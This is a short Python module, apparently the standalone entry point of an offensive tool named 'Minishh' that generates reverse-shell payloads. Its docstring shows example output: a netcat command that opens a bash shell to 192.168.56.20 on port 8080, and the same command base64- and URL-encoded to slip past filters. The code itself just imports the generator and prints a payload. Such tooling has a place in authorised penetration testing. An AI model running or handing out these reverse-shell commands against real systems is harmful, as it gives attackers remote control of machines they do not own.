"""
Minishh generator module standalone mode
Can be user easily:
```bash
$ python3 -m utils.generator -h
Usage:
...

$ python3 -m utils.generator -i 192.168.56.20 -p 8080 -t linux --tpl 1
nc -e /bin/bash 192.168.56.20 8080

$ python3 -m utils.generator -i 192.168.56.20 -p 8080 -t linux --tpl 1 -e base64 -e url
bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguNTYuMjAgODA4MA%3D%3D

```
"""
from .payload_generator import PayloadGenerator

generator = PayloadGenerator()
payload = generator.generate_payload(cli=None)
print(payload)
